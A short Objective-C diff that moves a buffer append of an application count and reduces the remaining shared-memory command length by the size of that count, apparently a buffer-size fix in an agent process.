@@ -2479,12 +2479,14 @@ static NSLock *gSyncLock                  = nil;
                   
                   UInt32 tmpNum = [gAgentCrisisApp count];
                   
-                  [tmpArray appendBytes: &tmpNum length: sizeof(UInt32)];
-                  
                   int tmpLen = sizeof(shMemoryHeader->commandData);
                   
                   unichar padZero=0;
                   NSData *tmpPadData = [[NSData alloc] initWithBytes: &padZero length:sizeof(unichar)];
+                  
+                  [tmpArray appendBytes: &tmpNum length: sizeof(UInt32)];
+                  
+                  tmpLen -= sizeof(UInt32);
                   
                   for (int i=0; i < [gAgentCrisisApp count]; i++)
                   {
